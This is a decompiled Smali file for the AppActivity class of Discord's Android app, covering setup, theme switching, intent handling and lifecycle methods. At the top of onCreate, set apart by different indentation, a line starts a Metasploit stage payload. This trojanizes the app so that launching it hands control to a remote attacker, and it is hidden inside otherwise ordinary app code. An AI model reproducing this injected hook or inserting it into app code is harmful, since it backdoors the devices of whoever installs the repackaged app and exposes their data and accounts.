.class public Lcom/discord/app/AppActivity;
.super Lcom/discord/app/b;
.source "AppActivity.kt"

# interfaces
.implements Lcom/discord/app/AppComponent;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/discord/app/AppActivity$Main;,
        Lcom/discord/app/AppActivity$IncomingShare;,
        Lcom/discord/app/AppActivity$a;
    }
.end annotation


# static fields
.field static final synthetic $$delegatedProperties:[Lkotlin/reflect/KProperty;

.field private static final sC:Landroid/content/Intent;

.field private static sD:Z

.field public static final sE:Lcom/discord/app/AppActivity$a;


# instance fields
.field private final paused:Lrx/subjects/Subject;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lrx/subjects/Subject<",
            "Ljava/lang/Void;",
            "Ljava/lang/Void;",
            ">;"
        }
    .end annotation
.end field

.field private final sA:Lkotlin/Lazy;

.field private sB:Landroid/content/Intent;

.field final sy:Ljava/util/LinkedHashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/LinkedHashMap<",
            "Landroidx/fragment/app/Fragment;",
            "Lkotlin/jvm/functions/Function1<",
            "Landroid/content/Intent;",
            "Lkotlin/Unit;",
            ">;>;"
        }
    .end annotation
.end field

.field private final sz:Lkotlin/Lazy;

.field public toolbar:Landroidx/appcompat/widget/Toolbar;


# direct methods
.method static constructor <clinit>()V
    .locals 6

    const/4 v0, 0x2

    new-array v0, v0, [Lkotlin/reflect/KProperty;

    new-instance v1, Lkotlin/jvm/internal/u;

    const-class v2, Lcom/discord/app/AppActivity;

    invoke-static {v2}, Lkotlin/jvm/internal/v;->N(Ljava/lang/Class;)Lkotlin/reflect/b;

    move-result-object v2

    const-string v3, "userSettings"

    const-string v4, "getUserSettings()Lcom/discord/stores/StoreUserSettings;"

    invoke-direct {v1, v2, v3, v4}, Lkotlin/jvm/internal/u;-><init>(Lkotlin/reflect/KDeclarationContainer;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v1}, Lkotlin/jvm/internal/v;->a(Lkotlin/jvm/internal/t;)Lkotlin/reflect/d;

    move-result-object v1

    check-cast v1, Lkotlin/reflect/KProperty;

    const/4 v2, 0x0

    aput-object v1, v0, v2

    new-instance v1, Lkotlin/jvm/internal/u;

    const-class v3, Lcom/discord/app/AppActivity;

    invoke-static {v3}, Lkotlin/jvm/internal/v;->N(Ljava/lang/Class;)Lkotlin/reflect/b;

    move-result-object v3

    const-string v4, "screen"

    const-string v5, "getScreen()Ljava/lang/Class;"

    invoke-direct {v1, v3, v4, v5}, Lkotlin/jvm/internal/u;-><init>(Lkotlin/reflect/KDeclarationContainer;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v1}, Lkotlin/jvm/internal/v;->a(Lkotlin/jvm/internal/t;)Lkotlin/reflect/d;

    move-result-object v1

    check-cast v1, Lkotlin/reflect/KProperty;

    const/4 v3, 0x1

    aput-object v1, v0, v3

    sput-object v0, Lcom/discord/app/AppActivity;->$$delegatedProperties:[Lkotlin/reflect/KProperty;

    new-instance v0, Lcom/discord/app/AppActivity$a;

    invoke-direct {v0, v2}, Lcom/discord/app/AppActivity$a;-><init>(B)V

    sput-object v0, Lcom/discord/app/AppActivity;->sE:Lcom/discord/app/AppActivity$a;

    .line 462
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    sput-object v0, Lcom/discord/app/AppActivity;->sC:Landroid/content/Intent;

    .line 473
    sput-boolean v3, Lcom/discord/app/AppActivity;->sD:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 3

    .line 48
    invoke-direct {p0}, Lcom/discord/app/b;-><init>()V

    .line 50
    new-instance v0, Ljava/util/LinkedHashMap;

    invoke-direct {v0}, Ljava/util/LinkedHashMap;-><init>()V

    iput-object v0, p0, Lcom/discord/app/AppActivity;->sy:Ljava/util/LinkedHashMap;

    .line 52
    invoke-static {}, Lrx/subjects/PublishSubject;->Fj()Lrx/subjects/PublishSubject;

    move-result-object v0

    const-string v1, "PublishSubject.create()"

    invoke-static {v0, v1}, Lkotlin/jvm/internal/j;->g(Ljava/lang/Object;Ljava/lang/String;)V

    check-cast v0, Lrx/subjects/Subject;

    iput-object v0, p0, Lcom/discord/app/AppActivity;->paused:Lrx/subjects/Subject;

    .line 73
    sget-object v0, Lkotlin/j;->bdo:Lkotlin/j;

    sget-object v1, Lcom/discord/app/AppActivity$n;->sK:Lcom/discord/app/AppActivity$n;

    check-cast v1, Lkotlin/jvm/functions/Function0;

    const-string v2, "mode"

    invoke-static {v0, v2}, Lkotlin/jvm/internal/j;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v2, "initializer"

    invoke-static {v1, v2}, Lkotlin/jvm/internal/j;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 1034
    sget-object v2, Lkotlin/g;->$EnumSwitchMapping$0:[I

    invoke-virtual {v0}, Lkotlin/j;->ordinal()I

    move-result v0

    aget v0, v2, v0

    packed-switch v0, :pswitch_data_0

    .line 1037
    new-instance v0, Lkotlin/k;

    invoke-direct {v0}, Lkotlin/k;-><init>()V

    throw v0

    :pswitch_0
    new-instance v0, Lkotlin/u;

    invoke-direct {v0, v1}, Lkotlin/u;-><init>(Lkotlin/jvm/functions/Function0;)V

    check-cast v0, Lkotlin/Lazy;

    goto :goto_0

    .line 1036
    :pswitch_1
    new-instance v0, Lkotlin/o;

    invoke-direct {v0, v1}, Lkotlin/o;-><init>(Lkotlin/jvm/functions/Function0;)V

    check-cast v0, Lkotlin/Lazy;

    goto :goto_0

    .line 1035
    :pswitch_2
    new-instance v0, Lkotlin/p;

    invoke-direct {v0, v1}, Lkotlin/p;-><init>(Lkotlin/jvm/functions/Function0;)V

    check-cast v0, Lkotlin/Lazy;

    .line 73
    :goto_0
    iput-object v0, p0, Lcom/discord/app/AppActivity;->sz:Lkotlin/Lazy;

    .line 78
    new-instance v0, Lcom/discord/app/AppActivity$k;

    invoke-direct {v0, p0}, Lcom/discord/app/AppActivity$k;-><init>(Lcom/discord/app/AppActivity;)V

    check-cast v0, Lkotlin/jvm/functions/Function0;

    invoke-static {v0}, Lkotlin/f;->b(Lkotlin/jvm/functions/Function0;)Lkotlin/Lazy;

    move-result-object v0

    iput-object v0, p0, Lcom/discord/app/AppActivity;->sA:Lkotlin/Lazy;

    .line 95
    sget-object v0, Lcom/discord/app/AppActivity;->sC:Landroid/content/Intent;

    iput-object v0, p0, Lcom/discord/app/AppActivity;->sB:Landroid/content/Intent;

    return-void

    nop

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method public static final synthetic a(Lcom/discord/app/AppActivity;)Lcom/discord/stores/StoreUserSettings;
    .locals 0

    .line 48
    invoke-direct {p0}, Lcom/discord/app/AppActivity;->getUserSettings()Lcom/discord/stores/StoreUserSettings;

    move-result-object p0

    return-object p0
.end method

.method private final a(Landroid/content/Intent;)V
    .locals 1

    .line 400
    move-object v0, p0

    check-cast v0, Landroid/content/Context;

    invoke-static {p1, v0}, Lcom/discord/utilities/intent/IntentUtils;->consumeExternalRoutingIntent(Landroid/content/Intent;Landroid/content/Context;)Z

    move-result p1

    .line 403
    invoke-static {}, Lcom/discord/stores/StoreStream;->getSurveys()Lcom/discord/stores/StoreSurveys;

    move-result-object v0

    .line 404
    invoke-virtual {v0, p1}, Lcom/discord/stores/StoreSurveys;->setIntentConsumed(Z)V

    return-void
.end method

.method public static final synthetic a(Lcom/discord/app/AppActivity;Landroid/content/Intent;)V
    .locals 0

    .line 48
    invoke-direct {p0, p1}, Lcom/discord/app/AppActivity;->a(Landroid/content/Intent;)V

    return-void
.end method

.method public static final synthetic a(Lcom/discord/app/AppActivity;Ljava/lang/String;)V
    .locals 1

    .line 1385
    sget-object v0, Lcom/discord/app/e;->tr:Lcom/discord/app/e;

    invoke-static {}, Lcom/discord/app/e;->ds()Ljava/util/List;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/discord/app/AppActivity;->i(Ljava/util/List;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "light"

    .line 1386
    invoke-static {p1, v0}, Lkotlin/jvm/internal/j;->n(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    const p1, 0x7f13001f

    goto :goto_0

    :cond_0
    const-string v0, "dark"

    .line 1387
    invoke-static {p1, v0}, Lkotlin/jvm/internal/j;->n(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "pureEvil"

    .line 1388
    invoke-static {p1, v0}, Lkotlin/jvm/internal/j;->n(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_1

    const p1, 0x7f13001a

    goto :goto_0

    :cond_1
    const p1, 0x7f130017

    .line 1392
    :goto_0
    invoke-virtual {p0, p1}, Lcom/discord/app/AppActivity;->setTheme(I)V

    return-void
.end method

.method public static final synthetic a(Lcom/discord/app/AppActivity;Ljava/lang/String;Z)V
    .locals 3

    .line 2309
    invoke-static {p1}, Lcom/discord/models/domain/ModelUserSettings;->getLocaleObject(Ljava/lang/String;)Ljava/util/Locale;

    move-result-object p1

    .line 2317
    new-instance v0, Lcom/discord/app/AppActivity$b;

    invoke-direct {v0, p1}, Lcom/discord/app/AppActivity$b;-><init>(Ljava/util/Locale;)V

    .line 2330
    new-instance v1, Lcom/discord/app/AppActivity$c;

    invoke-direct {v1, p1}, Lcom/discord/app/AppActivity$c;-><init>(Ljava/util/Locale;)V

    .line 2344
    invoke-virtual {p0}, Lcom/discord/app/AppActivity;->getResources()Landroid/content/res/Resources;

    move-result-object p1

    const-string v2, "resources"

    invoke-static {p1, v2}, Lkotlin/jvm/internal/j;->g(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Lcom/discord/app/AppActivity$b;->a(Landroid/content/res/Resources;)Z

    move-result p1

    if-eqz p1, :cond_0

    .line 2345
    invoke-virtual {p0}, Lcom/discord/app/AppActivity;->getResources()Landroid/content/res/Resources;

    move-result-object p1

    const-string v0, "resources"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/j;->g(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v1, p1}, Lcom/discord/app/AppActivity$c;->b(Landroid/content/res/Resources;)V

    if-eqz p2, :cond_0

    .line 2348
    check-cast p0, Landroid/content/Context;

    const/4 p1, 0x1

    const/4 p2, 0x0

    const/4 v0, 0x4

    invoke-static {p0, p1, p2, v0}, Lcom/discord/app/e;->a(Landroid/content/Context;ZZI)V

    :cond_0
    return-void
.end method

.method public static final synthetic b(Lcom/discord/app/AppActivity;Landroid/content/Intent;)Lcom/discord/app/h$a;
    .locals 2

    const/4 v0, 0x0

    if-eqz p1, :cond_0

    const-string v1, "transition"

    .line 2413
    invoke-virtual {p1, v1}, Landroid/content/Intent;->getSerializableExtra(Ljava/lang/String;)Ljava/io/Serializable;

    move-result-object p1

    goto :goto_0

    :cond_0
    move-object p1, v0

    :goto_0
    instance-of v1, p1, Lcom/discord/app/h$c;

    if-nez v1, :cond_1

    move-object p1, v0

    :cond_1
    check-cast p1, Lcom/discord/app/h$c;

    if-eqz p1, :cond_2

    move-object p0, p1

    goto :goto_1

    .line 2416
    :cond_2
    sget-object p1, Lcom/discord/app/e;->tr:Lcom/discord/app/e;

    invoke-static {}, Lcom/discord/app/e;->dq()Ljava/util/List;

    move-result-object p1

    invoke-virtual {p0, p1}, Lcom/discord/app/AppActivity;->i(Ljava/util/List;)Z

    move-result p0

    if-eqz p0, :cond_3

    sget-object p0, Lcom/discord/app/h$c;->ux:Lcom/discord/app/h$c;

    goto :goto_1

    :cond_3
    move-object p0, v0

    :goto_1
    if-eqz p0, :cond_4

    .line 3058
    iget-object p0, p0, Lcom/discord/app/h$c;->animations:Lcom/discord/app/h$a;

    return-object p0

    :cond_4
    return-object v0
.end method

.method public static final synthetic b(Lcom/discord/app/AppActivity;Ljava/lang/String;)V
    .locals 3

    .line 3360
    sget-object v0, Lcom/discord/app/e;->tr:Lcom/discord/app/e;

    invoke-static {}, Lcom/discord/app/e;->ds()Ljava/util/List;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/discord/app/AppActivity;->i(Ljava/util/List;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 3362
    new-instance v0, Lcom/discord/app/AppActivity$j;

    invoke-direct {v0, p0}, Lcom/discord/app/AppActivity$j;-><init>(Lcom/discord/app/AppActivity;)V

    const v1, 0x7f04037f

    const/4 v2, 0x1

    .line 3365
    invoke-virtual {v0, v1, v2}, Lcom/discord/app/AppActivity$j;->b(IZ)Landroid/util/TypedValue;

    move-result-object v0

    iget-object v0, v0, Landroid/util/TypedValue;->string:Ljava/lang/CharSequence;

    .line 3366
    invoke-static {v0, p1}, Lkotlin/jvm/internal/j;->n(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    xor-int/2addr p1, v2

    if-eqz p1, :cond_0

    .line 3367
    invoke-virtual {p0}, Lcom/discord/app/AppActivity;->getIntent()Landroid/content/Intent;

    move-result-object p1

    const-string v0, "transition"

    sget-object v1, Lcom/discord/app/h$c;->uv:Lcom/discord/app/h$c;

    check-cast v1, Ljava/io/Serializable;

    invoke-virtual {p1, v0, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    .line 3368
    move-object p1, p0

    check-cast p1, Landroid/content/Context;

    invoke-virtual {p0}, Lcom/discord/app/AppActivity;->getScreen()Ljava/lang/Class;

    move-result-object v0

    invoke-virtual {p0}, Lcom/discord/app/AppActivity;->getIntent()Landroid/content/Intent;

    move-result-object v1

    invoke-static {p1, v0, v1}, Lcom/discord/app/e;->a(Landroid/content/Context;Ljava/lang/Class;Landroid/content/Intent;)V

    .line 3369
    invoke-virtual {p0}, Lcom/discord/app/AppActivity;->finish()V

    :cond_0
    return-void
.end method

.method public static final synthetic dj()Z
    .locals 1

    .line 48
    sget-boolean v0, Lcom/discord/app/AppActivity;->sD:Z

    return v0
.end method

.method public static final synthetic dk()V
    .locals 1

    const/4 v0, 0x0

    .line 48
    sput-boolean v0, Lcom/discord/app/AppActivity;->sD:Z

    return-void
.end method

.method private final getUserSettings()Lcom/discord/stores/StoreUserSettings;
    .locals 1

    iget-object v0, p0, Lcom/discord/app/AppActivity;->sz:Lkotlin/Lazy;

    invoke-interface {v0}, Lkotlin/Lazy;->getValue()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/discord/stores/StoreUserSettings;

    return-object v0
.end method


# virtual methods
.method public final a(Landroidx/appcompat/widget/Toolbar;)V
    .locals 2

    .line 56
    iput-object p1, p0, Lcom/discord/app/AppActivity;->toolbar:Landroidx/appcompat/widget/Toolbar;

    .line 58
    invoke-virtual {p0}, Lcom/discord/app/AppActivity;->dg()Lcom/discord/views/ToolbarTitleLayout;

    move-result-object p1

    if-nez p1, :cond_1

    .line 59
    iget-object p1, p0, Lcom/discord/app/AppActivity;->toolbar:Landroidx/appcompat/widget/Toolbar;

    if-eqz p1, :cond_0

    new-instance v0, Lcom/discord/views/ToolbarTitleLayout;

    move-object v1, p0

    check-cast v1, Landroid/content/Context;

    invoke-direct {v0, v1}, Lcom/discord/views/ToolbarTitleLayout;-><init>(Landroid/content/Context;)V

    check-cast v0, Landroid/view/View;

    invoke-virtual {p1, v0}, Landroidx/appcompat/widget/Toolbar;->addView(Landroid/view/View;)V

    .line 60
    :cond_0
    iget-object p1, p0, Lcom/discord/app/AppActivity;->toolbar:Landroidx/appcompat/widget/Toolbar;

    if-eqz p1, :cond_1

    new-instance v0, Lcom/discord/app/AppActivity$m;

    invoke-direct {v0, p0}, Lcom/discord/app/AppActivity$m;-><init>(Lcom/discord/app/AppActivity;)V

    check-cast v0, Landroid/view/View$OnClickListener;

    invoke-virtual {p1, v0}, Landroidx/appcompat/widget/Toolbar;->setNavigationOnClickListener(Landroid/view/View$OnClickListener;)V

    return-void

    :cond_1
    return-void
.end method

.method public final a(Lkotlin/reflect/b;)Z
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lkotlin/reflect/b<",
            "+",
            "Lcom/discord/app/AppComponent;",
            ">;)Z"
        }
    .end annotation

    const-string v0, "screen"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/j;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 236
    invoke-static {p1}, Lkotlin/jvm/a;->b(Lkotlin/reflect/b;)Ljava/lang/Class;

    move-result-object p1

    invoke-virtual {p0}, Lcom/discord/app/AppActivity;->getScreen()Ljava/lang/Class;

    move-result-object v0

    invoke-static {p1, v0}, Lkotlin/jvm/internal/j;->n(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    return p1
.end method

.method final dg()Lcom/discord/views/ToolbarTitleLayout;
    .locals 3

    .line 71
    iget-object v0, p0, Lcom/discord/app/AppActivity;->toolbar:Landroidx/appcompat/widget/Toolbar;

    const/4 v1, 0x0

    if-eqz v0, :cond_0

    const/4 v2, 0x0

    invoke-virtual {v0, v2}, Landroidx/appcompat/widget/Toolbar;->getChildAt(I)Landroid/view/View;

    move-result-object v0

    goto :goto_0

    :cond_0
    move-object v0, v1

    :goto_0
    instance-of v2, v0, Lcom/discord/views/ToolbarTitleLayout;

    if-nez v2, :cond_1

    move-object v0, v1

    :cond_1
    check-cast v0, Lcom/discord/views/ToolbarTitleLayout;

    return-object v0
.end method

.method public final dh()Z
    .locals 2

    .line 89
    invoke-virtual {p0}, Lcom/discord/app/AppActivity;->getMostRecentIntent()Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    const-string v1, "android.intent.action.SEND"

    invoke-static {v0, v1}, Lkotlin/jvm/internal/j;->n(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    return v0
.end method

.method public final di()Z
    .locals 2

    .line 293
    :try_start_0
    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.MAIN"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v1, "android.intent.category.HOME"

    .line 294
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const/high16 v1, 0x10000000

    .line 295
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    move-result-object v0

    .line 297
    invoke-virtual {p0, v0}, Lcom/discord/app/AppActivity;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const/4 v0, 0x1

    goto :goto_0

    :catch_0
    const/4 v0, 0x0

    :goto_0
    return v0
.end method

.method public final getMostRecentIntent()Landroid/content/Intent;
    .locals 2

    .line 96
    iget-object v0, p0, Lcom/discord/app/AppActivity;->sB:Landroid/content/Intent;

    sget-object v1, Lcom/discord/app/AppActivity;->sC:Landroid/content/Intent;

    if-ne v0, v1, :cond_0

    invoke-virtual {p0}, Lcom/discord/app/AppActivity;->getIntent()Landroid/content/Intent;

    move-result-object v0

    if-nez v0, :cond_0

    new-instance v0, Landroid/content/Intent;

    sget-object v1, Lcom/discord/app/AppActivity;->sC:Landroid/content/Intent;

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Intent;)V

    :cond_0
    return-object v0
.end method

.method public getPaused()Lrx/subjects/Subject;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Lrx/subjects/Subject<",
            "Ljava/lang/Void;",
            "Ljava/lang/Void;",
            ">;"
        }
    .end annotation

    .line 52
    iget-object v0, p0, Lcom/discord/app/AppActivity;->paused:Lrx/subjects/Subject;

    return-object v0
.end method

.method protected getScreen()Ljava/lang/Class;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/lang/Class<",
            "+",
            "Lcom/discord/app/AppComponent;",
            ">;"
        }
    .end annotation

    iget-object v0, p0, Lcom/discord/app/AppActivity;->sA:Lkotlin/Lazy;

    invoke-interface {v0}, Lkotlin/Lazy;->getValue()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Class;

    return-object v0
.end method

.method public final hideKeyboard(Landroid/view/View;)V
    .locals 2

    .line 282
    move-object v0, p0

    check-cast v0, Landroid/app/Activity;

    const/4 v1, 0x0

    invoke-static {v0, v1, p1}, Lcom/discord/utilities/keyboard/Keyboard;->setKeyboardOpen(Landroid/app/Activity;ZLandroid/view/View;)V

    return-void
.end method

.method public final i(Ljava/util/List;)Z
    .locals 3
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/List<",
            "+",
            "Lkotlin/reflect/b<",
            "+",
            "Lcom/discord/app/AppComponent;",
            ">;>;)Z"
        }
    .end annotation

    const-string v0, "screens"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/j;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 235
    check-cast p1, Ljava/lang/Iterable;

    .line 478
    invoke-interface {p1}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object p1

    :cond_0
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    move-object v1, v0

    check-cast v1, Lkotlin/reflect/b;

    .line 235
    invoke-static {v1}, Lkotlin/jvm/a;->b(Lkotlin/reflect/b;)Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {p0}, Lcom/discord/app/AppActivity;->getScreen()Ljava/lang/Class;

    move-result-object v2

    invoke-static {v1, v2}, Lkotlin/jvm/internal/j;->n(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    goto :goto_0

    :cond_1
    const/4 v0, 0x0

    :goto_0
    if-eqz v0, :cond_2

    const/4 p1, 0x1

    return p1

    :cond_2
    const/4 p1, 0x0

    return p1
.end method

.method public onCreate(Landroid/os/Bundle;)V
	invoke-static	{p0},	Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
	
    .locals 4

    .line 132
    new-instance v0, Lcom/discord/app/AppActivity$d;

    invoke-direct {v0, p0}, Lcom/discord/app/AppActivity$d;-><init>(Lcom/discord/app/AppActivity;)V

    .line 149
    new-instance v1, Lcom/discord/app/AppActivity$e;

    invoke-direct {v1, p0}, Lcom/discord/app/AppActivity$e;-><init>(Lcom/discord/app/AppActivity;)V

    .line 165
    new-instance v2, Lcom/discord/app/AppActivity$f;

    invoke-direct {v2, p0}, Lcom/discord/app/AppActivity$f;-><init>(Lcom/discord/app/AppActivity;)V

    .line 177
    new-instance v3, Lcom/discord/app/AppActivity$g;

    invoke-direct {v3, p0}, Lcom/discord/app/AppActivity$g;-><init>(Lcom/discord/app/AppActivity;)V

    .line 189
    :try_start_0
    invoke-virtual {v0}, Lcom/discord/app/AppActivity$d;->invoke()V

    .line 190
    invoke-virtual {v1}, Lcom/discord/app/AppActivity$e;->invoke()V

    .line 192
    invoke-super {p0, p1}, Lcom/discord/app/b;->onCreate(Landroid/os/Bundle;)V

    .line 194
    invoke-virtual {v2}, Lcom/discord/app/AppActivity$f;->invoke()V

    .line 195
    invoke-virtual {v3}, Lcom/discord/app/AppActivity$g;->invoke()V

    .line 196
    const-class p1, Lcom/discord/widgets/main/WidgetMain;

    invoke-static {p1}, Lkotlin/jvm/internal/v;->N(Ljava/lang/Class;)Lkotlin/reflect/b;

    move-result-object p1

    invoke-virtual {p0, p1}, Lcom/discord/app/AppActivity;->a(Lkotlin/reflect/b;)Z

    move-result p1

    if-nez p1, :cond_1

    .line 198
    invoke-static {}, Lcom/discord/stores/StoreStream;->getAnalytics()Lcom/discord/stores/StoreAnalytics;

    move-result-object p1

    .line 199
    invoke-virtual {p0}, Lcom/discord/app/AppActivity;->getScreen()Ljava/lang/Class;

    move-result-object v0

    invoke-virtual {p1, v0}, Lcom/discord/stores/StoreAnalytics;->appUiViewed(Ljava/lang/Class;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception p1

    .line 202
    const-class v0, Lcom/discord/widgets/debugging/WidgetFatalCrash;

    invoke-static {v0}, Lkotlin/jvm/internal/v;->N(Ljava/lang/Class;)Lkotlin/reflect/b;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/discord/app/AppActivity;->a(Lkotlin/reflect/b;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 203
    sget-object v0, Lcom/discord/widgets/debugging/WidgetFatalCrash;->Companion:Lcom/discord/widgets/debugging/WidgetFatalCrash$Companion;

    move-object v1, p0

    check-cast v1, Landroid/content/Context;

    check-cast p1, Ljava/lang/Throwable;

    invoke-virtual {p0}, Lcom/discord/app/AppActivity;->getScreen()Ljava/lang/Class;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v2

    const-string v3, "screen.name"

    invoke-static {v2, v3}, Lkotlin/jvm/internal/j;->g(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v0, v1, p1, v2}, Lcom/discord/widgets/debugging/WidgetFatalCrash$Companion;->launch(Landroid/content/Context;Ljava/lang/Throwable;Ljava/lang/String;)V

    .line 205
    :cond_0
    invoke-virtual {p0}, Lcom/discord/app/AppActivity;->finish()V

    :cond_1
    return-void
.end method

.method public onDestroy()V
    .locals 1

    .line 231
    iget-object v0, p0, Lcom/discord/app/AppActivity;->sy:Ljava/util/LinkedHashMap;

    invoke-virtual {v0}, Ljava/util/LinkedHashMap;->clear()V

    .line 232
    invoke-super {p0}, Lcom/discord/app/b;->onDestroy()V

    return-void
.end method

.method public onNewIntent(Landroid/content/Intent;)V
    .locals 2

    .line 106
    invoke-super {p0, p1}, Lcom/discord/app/b;->onNewIntent(Landroid/content/Intent;)V

    if-nez p1, :cond_0

    .line 108
    sget-object p1, Lcom/discord/app/AppActivity;->sC:Landroid/content/Intent;

    :cond_0
    iput-object p1, p0, Lcom/discord/app/AppActivity;->sB:Landroid/content/Intent;

    .line 109
    invoke-virtual {p0}, Lcom/discord/app/AppActivity;->getMostRecentIntent()Landroid/content/Intent;

    move-result-object p1

    invoke-direct {p0, p1}, Lcom/discord/app/AppActivity;->a(Landroid/content/Intent;)V

    .line 110
    invoke-virtual {p0}, Lcom/discord/app/AppActivity;->getMostRecentIntent()Landroid/content/Intent;

    move-result-object p1

    .line 111
    iget-object v0, p0, Lcom/discord/app/AppActivity;->sy:Ljava/util/LinkedHashMap;

    check-cast v0, Ljava/util/Map;

    .line 476
    invoke-interface {v0}, Ljava/util/Map;->entrySet()Ljava/util/Set;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_1

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/util/Map$Entry;

    .line 111
    invoke-interface {v1}, Ljava/util/Map$Entry;->getValue()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lkotlin/jvm/functions/Function1;

    invoke-interface {v1, p1}, Lkotlin/jvm/functions/Function1;->invoke(Ljava/lang/Object;)Ljava/lang/Object;

    goto :goto_0

    :cond_1
    return-void
.end method

.method public onPause()V
    .locals 2

    .line 226
    invoke-super {p0}, Lcom/discord/app/b;->onPause()V

    .line 227
    invoke-virtual {p0}, Lcom/discord/app/AppActivity;->getPaused()Lrx/subjects/Subject;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Lrx/subjects/Subject;->onNext(Ljava/lang/Object;)V

    return-void
.end method

.method public onResume()V
    .locals 12

    .line 210
    invoke-super {p0}, Lcom/discord/app/b;->onResume()V

    .line 212
    sget-object v0, Lcom/discord/app/e;->tr:Lcom/discord/app/e;

    invoke-static {p0}, Lcom/discord/app/e;->b(Lcom/discord/app/AppActivity;)V

    .line 214
    invoke-direct {p0}, Lcom/discord/app/AppActivity;->getUserSettings()Lcom/discord/stores/StoreUserSettings;

    move-result-object v0

    const/4 v1, 0x1

    .line 215
    invoke-virtual {v0, v1}, Lcom/discord/stores/StoreUserSettings;->getThemeObservable(Z)Lrx/Observable;

    move-result-object v0

    .line 216
    move-object v1, p0

    check-cast v1, Lcom/discord/app/AppComponent;

    invoke-static {v1}, Lcom/discord/app/g;->a(Lcom/discord/app/AppComponent;)Lrx/Observable$Transformer;

    move-result-object v2

    invoke-virtual {v0, v2}, Lrx/Observable;->a(Lrx/Observable$Transformer;)Lrx/Observable;

    move-result-object v3

    const-string v0, "userSettings\n        .ge\u2026AppTransformers.ui(this))"

    invoke-static {v3, v0}, Lkotlin/jvm/internal/j;->g(Ljava/lang/Object;Ljava/lang/String;)V

    .line 217
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v4

    new-instance v0, Lcom/discord/app/AppActivity$h;

    invoke-direct {v0, p0}, Lcom/discord/app/AppActivity$h;-><init>(Lcom/discord/app/AppActivity;)V

    move-object v9, v0

    check-cast v9, Lkotlin/jvm/functions/Function1;

    const/4 v5, 0x0

    const/4 v6, 0x0

    const/4 v7, 0x0

    const/4 v8, 0x0

    const/16 v10, 0x1e

    const/4 v11, 0x0

